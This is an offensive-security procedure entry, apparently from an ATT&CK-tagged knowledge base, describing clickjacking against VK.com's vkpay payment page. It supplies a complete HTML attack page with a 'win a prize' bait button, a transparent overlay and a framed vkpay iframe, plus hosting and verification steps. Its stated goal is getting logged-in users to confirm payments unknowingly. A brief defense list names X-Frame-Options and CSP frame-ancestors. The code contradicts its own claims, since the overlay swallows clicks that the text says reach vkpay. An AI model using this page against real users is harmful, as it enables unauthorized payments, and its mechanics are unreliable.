---
id: proc-clickjacking-vkpay-demo
tags:
  - clickjacking
  - ui-redressing
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.865Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Demonstrate Clickjacking on vkpay

## Summary

This procedure demonstrates a clickjacking (UI redressing) attack on VK.com's vkpay feature by embedding the payment interface in an iframe and overlaying malicious transparent elements to trick users into authorizing unintended transactions, exploiting the absence of frame-busting protections or X-Frame-Options headers.

## Description

Clickjacking involves tricking users into clicking on hidden or disguised elements by overlaying a legitimate webpage within an iframe on a malicious site. In this case, the vkpay feature on VK.com was vulnerable as of June 30, 2018, allowing attackers to frame the payment authorization interface. An attacker could create a webpage that loads vkpay in an iframe, position invisible divs over buttons like 'Confirm Payment', and map those clicks to perform actions without the user's awareness. The vulnerability was rated medium severity (CVSS 4.3) and could lead to unauthorized financial operations. Prerequisites include a web browser and a local server to host the attack page; the target must be a logged-in VK.com user accessing the malicious site.

## Requirements

1. Web browser (e.g., Chrome or Firefox) with developer tools enabled
2. Local web server (e.g., Python's SimpleHTTPServer) to host the malicious HTML page
3. Internet access to VK.com
4. User account on VK.com to simulate authenticated interactions

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN headers on all pages
- Use frame-busting JavaScript: if (top !== self) { top.location = self.location; }
- Content Security Policy (CSP) with frame-ancestors directive to restrict framing
- Monitor for unusual iframe embeddings via web application firewall (WAF) logs

## Objectives

1. Embed vkpay interface in an iframe to bypass visibility restrictions
2. Overlay UI elements to capture and redirect user clicks to sensitive actions
3. Achieve unauthorized user interaction, such as payment confirmation, without direct consent

## Instructions

### Step 1: Create Malicious HTML Page

**Context**: Build the attack page that embeds vkpay in an iframe and adds overlay elements for click manipulation.

Create an HTML file named `clickjack.html` with the following content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
    <style>
        #frame { position: absolute; top: 0; left: 0; opacity: 0.5; }
        #overlay { position: absolute; top: 200px; left: 300px; width: 100px; height: 40px; background: transparent; z-index: 1; }
        #bait { position: absolute; top: 200px; left: 300px; width: 100px; height: 40px; background: red; z-index: 2; color: white; text-align: center; line-height: 40px; }
    </style>
</head>
<body>
    <h1>Click the red button to win a prize!</h1>
    <div id="bait">Click Here!</div>
    <iframe id="frame" src="https://vk.com/vkpay" width="800" height="600"></iframe>
    <div id="overlay" onclick="alert('Click captured! This would trigger payment on vkpay');"></div>
</body>
</html>
```

> This sets up a semi-transparent iframe loading vkpay. The red bait button overlays a transparent div positioned over the vkpay 'Confirm' button (adjust coordinates based on vkpay layout). Clicking the bait triggers the overlay, simulating a malicious action.

### Step 2: Host and Test the Page

**Context**: Serve the page locally and test the clickjacking in a browser while authenticated to VK.com.

Start a local server using Python (assuming Python 3):

```bash
python -m http.server 8000
```

Open `http://localhost:8000/clickjack.html` in a browser logged into VK.com. Position the overlay over a vkpay action button by inspecting elements (use browser dev tools to adjust top/left values for precise alignment).

> Expected output: vkpay loads in the iframe. Clicking the red bait button should not visibly interact with the iframe but triggers the onclick in the overlay, demonstrating click capture. In a real attack, the overlay would submit forms or click hidden elements in the iframe.

### Step 3: Verify Vulnerability

**Context**: Confirm the framing works without restrictions and simulate impact.

In the browser console, check for frame-busting errors (none should appear). Interact with the overlaid elements to ensure clicks propagate to vkpay actions, such as authorizing a test transaction.

> Success: No 'refused to display' errors from X-Frame-Options. Clicks on overlay lead to unintended vkpay behavior, like form submission.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[ui-redressing]]
- [[web-vulnerability]]
